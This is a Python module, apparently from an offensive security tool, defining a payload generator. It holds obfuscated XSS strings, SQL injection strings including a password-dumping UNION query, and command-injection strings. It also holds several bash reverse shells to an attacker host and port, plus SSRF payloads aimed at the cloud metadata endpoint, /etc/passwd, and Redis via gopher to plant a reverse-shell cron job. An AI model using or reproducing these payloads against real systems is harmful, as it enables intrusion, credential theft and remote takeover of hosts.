# zrc/ai/payload_generator.py — v15.1
import random
import base64
import urllib.parse
from typing import List, Dict

class PayloadGenerator:
    @staticmethod
    def _obfuscate(payload: str) -> str:
        methods = [
            lambda p: base64.b64encode(p.encode()).decode(),
            lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
            lambda p: ''.join(f'&#{ord(c)};' for c in p),
            lambda p: p.replace(' ', '/**/')
        ]
        return random.choice(methods)(payload)

    @staticmethod
    def xss() -> List[str]:
        base = "alert('XSS')"
        variants = [
            f"<script>{base}</script>",
            f"<img src=x onerror={base}>",
            f"javascript:{base}",
            f"\"'><script>{base}</script>",
            f"<svg onload={base}>",
        ]
        return [PayloadGenerator._obfuscate(v) for v in variants]

    @staticmethod
    def sqli() -> List[str]:
        return [
            "' OR 1=1--",
            "1' UNION SELECT password FROM users--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]

    @staticmethod
    def rce() -> List[str]:
        return [
            "$(id)",
            "`id`",
            "|id",
            ";id",
            "&& id",
            "|| id",
            "$(whoami)",
            "; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        ]

    @staticmethod
    def ssrf() -> List[str]:
        return [
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_SET%20x%20%22\\n\\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\n\\n"
        ]

    @staticmethod
    def reverse_shell(lhost: str, lport: int) -> str:
        return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

    @staticmethod
    def all_payloads(lhost: str = "192.168.1.100", lport: int = 4444) -> Dict[str, List[str]]:
        return {
            "xss": PayloadGenerator.xss(),
            "sqli": PayloadGenerator.sqli(),
            "rce": [p.format(lhost=lhost, lport=lport) if '{lhost}' in p else p for p in PayloadGenerator.rce()],
            "ssrf": PayloadGenerator.ssrf(),
            "reverse_shell": [PayloadGenerator.reverse_shell(lhost, lport)]
        }